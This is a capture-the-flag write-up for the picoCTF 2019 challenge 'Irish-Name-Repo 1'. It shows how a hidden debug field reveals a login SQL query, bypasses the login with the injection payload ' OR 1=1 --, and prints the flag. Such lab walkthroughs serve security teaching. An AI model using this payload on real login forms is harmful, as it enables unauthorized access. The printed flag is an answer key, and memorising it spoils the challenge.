# Irish-Name-Repo 1

> There is a website running at ``https://2019shell1.picoctf.com/problem/12273/`` ([link](https://2019shell1.picoctf.com/problem/12273/)) or http://2019shell1.picoctf.com:12273. Do you think you can log us in? Try to see if you can login!

> Hints: There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database? Try to think about how does the website verify your login?

As suggested by the hints, this is a SQL injection, the language most commonly assocaited with database searches.

Navigating to the [login page](https://2019shell1.picoctf.com/problem/12273/login.html) and inspecting, we find that there is a hidden input to the POST request named ``debug``.
```html
<form action="login.php" method="POST">
    <fieldset>
        ...
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```
Entering something random in for the username and password and then setting the ``debug`` to ``1`` greets us with the following invalid login page.
<pre>
username: something random
password: something random
SQL query: SELECT * FROM users WHERE name='something random' AND password='something random'
<h1>Login failed.</h1>
</pre>
So indeed, this is a SQL injection. Currently, the SQL querry looks like the following.
```sql
SELECT * FROM users WHERE name='something random' AND password='something random'
```
We note that if we inject ``' OR 1=1 --``, the poor sanitation that SQL works with on strings will cause the querry to close the string on ``'`` and then evaluate the ``OR 1=1``, which is always true. We then kindly comment out the rest of the querry with ``--``. Formatted, the injection looks like this.
```sql
SELECT * FROM users WHERE name='' OR 1=1 --' AND password='something random'
```

Inputting the injection greets us with the flag.
<pre>
username: ' OR 1=1 --
password: something random
SQL query: SELECT * FROM users WHERE name='' OR 1=1 --' AND password='something random'
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_34865514}</p>
</pre>
> ``picoCTF{s0m3_SQL_34865514}``
